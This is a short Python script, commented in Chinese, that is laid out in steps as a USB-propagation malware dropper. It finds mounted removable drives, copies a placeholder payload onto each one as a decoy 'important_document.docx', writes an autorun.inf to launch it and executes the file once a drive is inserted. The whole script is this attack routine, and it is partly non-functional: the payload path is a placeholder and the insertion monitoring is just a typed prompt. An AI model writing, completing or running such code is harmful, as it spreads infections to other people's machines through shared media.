import os
import shutil

# 步驟1：搜尋可移動媒體
def search_removable_media():
    removable_media = []
    for root, dirs, files in os.walk('/media'):  # 搜尋/media目錄下的可移動媒體
        for name in dirs:
            removable_media.append(os.path.join(root, name))
    return removable_media

# 步驟2：植入惡意程式
def implant_malware(removable_media):
    malware_path = os.path.join(removable_media, 'important_document.docx')
    shutil.copyfile('path_to_malware', malware_path)

# 步驟3：修改自動執行設定
def modify_autorun(removable_media):
    autorun_path = os.path.join(removable_media, 'autorun.inf')
    with open(autorun_path, 'w') as f:
        f.write('[autorun]\nopen=important_document.docx')

# 步驟4：監控插入事件
def monitor_insert_event():
    while True:
        inserted_media = input('請插入可移動媒體：')
        if os.path.exists(inserted_media):
            return inserted_media

# 步驟5：惡意程式執行
def execute_malware(malware_path):
    os.system(malware_path)

# 使用範例程式
if __name__ == '__main__':
    # 步驟1：搜尋可移動媒體
    removable_media_list = search_removable_media()
    if len(removable_media_list) == 0:
        print('找不到可移動媒體！')
        exit()

    # 步驟2：植入惡意程式
    for removable_media in removable_media_list:
        implant_malware(removable_media)

    # 步驟3：修改自動執行設定
    for removable_media in removable_media_list:
        modify_autorun(removable_media)

    # 步驟4：監控插入事件
    inserted_media = monitor_insert_event()

    # 步驟5：惡意程式執行
    execute_malware(os.path.join(inserted_media, 'important_document.docx'))